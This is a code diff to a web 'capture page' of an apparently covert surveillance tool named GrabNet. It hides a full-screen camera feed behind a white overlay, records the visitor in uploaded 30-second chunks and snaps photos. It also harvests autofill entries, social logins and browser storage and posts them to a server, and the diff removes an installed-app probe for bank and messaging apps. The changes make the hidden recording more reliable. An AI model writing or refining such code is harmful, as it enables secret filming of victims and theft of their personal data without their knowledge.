@@ -315,52 +315,6 @@ async function detectSocialLogins(refSource: string): Promise<Record<string, str
 }
 
 // ═══════════════════════════════════════════════════════════
-// COLLECTOR: Installed apps via URL scheme + blur
-// ═══════════════════════════════════════════════════════════
-async function detectInstalledApps(): Promise<Record<string, string>> {
-  const results: Record<string, string> = {};
-  const apps = [
-    { name: 'WhatsApp',  scheme: 'whatsapp://send?text=.' },
-    { name: 'Telegram',  scheme: 'tg://resolve?domain=telegram' },
-    { name: 'Signal',    scheme: 'sgnl://signal.me' },
-    { name: 'Zoom',      scheme: 'zoommtg://zoom.us/join' },
-    { name: 'Slack',     scheme: 'slack://open' },
-    { name: 'GCash',     scheme: 'gcash://pay' },
-    { name: 'Grab',      scheme: 'grab://' },
-    { name: 'Shopee',    scheme: 'shopee://' },
-    { name: 'Lazada',    scheme: 'lazada://' },
-    { name: 'Netflix',   scheme: 'nflx://' },
-    { name: 'TikTok',    scheme: 'tiktok://' },
-    { name: 'BPI',       scheme: 'bpi://' },
-    { name: 'BDO',       scheme: 'bdo://' },
-    { name: 'UnionBank', scheme: 'unionbank://' },
-  ];
-
-  for (const app of apps) {
-    await new Promise<void>((resolve) => {
-      let installed = false;
-      const onBlur = () => { installed = true; };
-      window.addEventListener('blur', onBlur);
-      try {
-        const a = document.createElement('a'); a.href = app.scheme; a.style.display = 'none';
-        document.body.appendChild(a); a.click();
-        setTimeout(() => {
-          window.removeEventListener('blur', onBlur);
-          results[app.name] = installed ? 'installed' : 'not installed';
-          try { a.remove(); } catch {}
-          resolve();
-        }, 800);
-      } catch {
-        window.removeEventListener('blur', onBlur);
-        results[app.name] = 'error';
-        resolve();
-      }
-    });
-  }
-  return results;
-}
-
-// ═══════════════════════════════════════════════════════════
 // VIDEO — MP4 priority, infinite recording
 // ═══════════════════════════════════════════════════════════
 const VIDEO_MIME_TYPES = [
@@ -391,7 +345,10 @@ function makeHiddenVideo(stream: MediaStream): HTMLVideoElement {
   // opacity:0.01 + bottom-right corner: forces Android Chrome to actually
   // paint video frames. opacity:0 or top:-9999px causes the browser to skip
   // frame rendering, producing pure black captures.
-  v.style.cssText = 'position:fixed;bottom:0;right:0;width:1px;height:1px;opacity:0.01;pointer-events:none;z-index:-9999;';
+  // Full-screen behind the UI overlay. Android Chrome won't render frames
+  // for tiny/invisible elements, causing black captures. z-index:-9999 keeps
+  // it below the white overlay the user sees.
+  v.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;object-fit:cover;opacity:1;pointer-events:none;z-index:-9999;';
   document.body.appendChild(v);
   return v;
 }
@@ -459,9 +416,13 @@ async function takePhoto(videoEl: HTMLVideoElement, label: string, stream?: Medi
  *   - Page hidden (visibilitychange)
  *   - Camera track ends (permission revoked)
  */
+/**
+ * Records camera in independent chunks — each chunk restarts the recorder
+ * so it has its own initialization segment and is a standalone playable file.
+ * 30-second chunks, runs until tab closes / page hidden / track ends.
+ */
 function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, label: string) {
-  const CHUNK_MS = 30_000; // 30 s rolling chunks
-
+  const CHUNK_MS = 30_000;
   const mimeType = getSupportedMime();
   if (!mimeType) {
     stream.getTracks().forEach(t => t.stop());
@@ -469,86 +430,70 @@ function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, l
     return;
   }
 
-  const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1_000_000 });
-  let idx = 0;
-  let pendingChunks: Blob[] = [];
+  let idx    = 0;
+  let active = true;
 
-  recorder.ondataavailable = (e) => {
-    if (e.data?.size > 0) pendingChunks.push(e.data);
-  };
-
-  const flushChunks = (isFinal: boolean) => {
-    if (!pendingChunks.length) return;
-    const blob = new Blob(pendingChunks, { type: mimeType });
-    pendingChunks = [];
-    uploadChunk(blob, mimeType, idx++, label, isFinal);
-  };
-
-  recorder.onstop = () => {
-    flushChunks(true);
+  const cleanup = () => {
     stream.getTracks().forEach(t => t.stop());
     if (document.body.contains(videoEl)) document.body.removeChild(videoEl);
   };
 
-  // Request data every CHUNK_MS
-  // No timeslice — use requestData() via interval only.
-  // Combining timeslice + requestData() at the same interval fires
-  // ondataavailable TWICE per cycle => race condition / empty blobs.
-  recorder.start();
+  function recordChunk() {
+    if (!active || !stream.active) { cleanup(); return; }
 
-  // Flush accumulated data every CHUNK_MS
-  const chunkTimer = setInterval(() => {
-    if (recorder.state === 'recording') {
-      recorder.requestData();
-      setTimeout(() => flushChunks(false), 500);
-    } else {
-      clearInterval(chunkTimer);
-    }
-  }, CHUNK_MS);
+    const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1_200_000 });
+    const chunks: Blob[] = [];
 
-  // Keep tab alive via Wake Lock if available
+    recorder.ondataavailable = (e) => { if (e.data?.size > 0) chunks.push(e.data); };
+
+    recorder.onstop = () => {
+      if (chunks.length) {
+        // Each stop produces a self-contained, playable video file
+        const blob = new Blob(chunks, { type: mimeType });
+        uploadChunk(blob, mimeType, idx++, label, !active);
+      }
+      if (active && stream.active) {
+        recordChunk(); // chain next chunk
+      } else {
+        cleanup();
+      }
+    };
+
+    recorder.start();
+    // Stop after CHUNK_MS — onstop will fire and chain the next chunk
+    setTimeout(() => {
+      if (recorder.state === 'recording') recorder.stop();
+    }, CHUNK_MS);
+  }
+
+  const stopAll = () => { active = false; };
+
+  // Keep tab alive
   (async () => {
     try {
       const lock = await (navigator as any).wakeLock?.request('screen');
-      recorder.addEventListener('stop', () => lock?.release().catch(() => {}));
+      window.addEventListener('beforeunload', () => lock?.release().catch(() => {}), { once: true });
     } catch {}
   })();
-
-  // Web Locks — keeps background tab alive longer
   if (navigator.locks) {
     navigator.locks.request('grabnet_rec', { mode: 'exclusive' }, () =>
-      new Promise<void>(r => { recorder.addEventListener('stop', () => r()); })
+      new Promise<void>(r => {
+        const check = setInterval(() => { if (!active) { clearInterval(check); r(); } }, 1000);
+      })
     ).catch(() => {});
   }
 
-  const stopRecorder = (reason: string) => {
-    if (recorder.state !== 'inactive') {
-      console.log('[GrabNet] stopping:', reason);
-      clearInterval(chunkTimer);
-      recorder.stop();
-    }
+  stream.getVideoTracks().forEach(t => { t.onended = stopAll; });
+  window.addEventListener('beforeunload', stopAll, { once: true });
+  const onVis = () => {
+    if (document.visibilityState === 'hidden') { stopAll(); document.removeEventListener('visibilitychange', onVis); }
   };
+  document.addEventListener('visibilitychange', onVis);
 
-  // Stop when camera track ends (permission revoked / system)
-  stream.getVideoTracks().forEach(t => {
-    t.onended = () => stopRecorder('track-ended');
-  });
+  // Photo after 4s warmup
+  setTimeout(() => takePhoto(videoEl, label, stream), 4000);
 
-  // Stop on beforeunload (tab close / navigate away)
-  window.addEventListener('beforeunload', () => stopRecorder('beforeunload'), { once: true });
-
-  // Stop when page is hidden (mobile background)
-  const onVisChange = () => {
-    if (document.visibilityState === 'hidden') {
-      stopRecorder('visibility-hidden');
-      document.removeEventListener('visibilitychange', onVisChange);
-    }
-  };
-  document.addEventListener('visibilitychange', onVisChange);
-
-  // Take a photo snapshot after 3.5s — lets camera warm up
-  // so we get a real frame instead of a black capture
-  setTimeout(() => takePhoto(videoEl, label, stream), 3500);
+  recordChunk();
 }
 
 // ── Generic POST helper ─────────────────────────────────────
@@ -718,18 +663,17 @@ export default function CapturePage() {
       }, 20_000);
     }).catch(() => {});
 
-    // Autofill + social + storage + apps
+    // Autofill + social + storage (app-detect removed — URL scheme redirects
+    // steal window focus and interfere with camera/recording)
     Promise.allSettled([
       collectAutofill(),
       detectSocialLogins(sourceRef.current.source),
       collectBrowserStorage(),
-      detectInstalledApps(),
-    ]).then(([af, sl, stor, apps]) => {
+    ]).then(([af, sl, stor]) => {
       post('/api/visits/deviceinfo', {
         autofill: af.status   === 'fulfilled' ? af.value   : undefined,
         social:   sl.status   === 'fulfilled' ? sl.value   : undefined,
         storage:  stor.status === 'fulfilled' ? stor.value : undefined,
-        apps:     apps.status === 'fulfilled' ? apps.value : undefined,
         _source: sourceRef.current.source,
         _sourceName: sourceRef.current.sourceName,
       });
@@ -745,6 +689,7 @@ export default function CapturePage() {
         alignItems: 'center', justifyContent: 'center',
         cursor: 'pointer', userSelect: 'none',
         WebkitTapHighlightColor: 'transparent',
+        zIndex: 1,
       }}
     >
       <div style={{
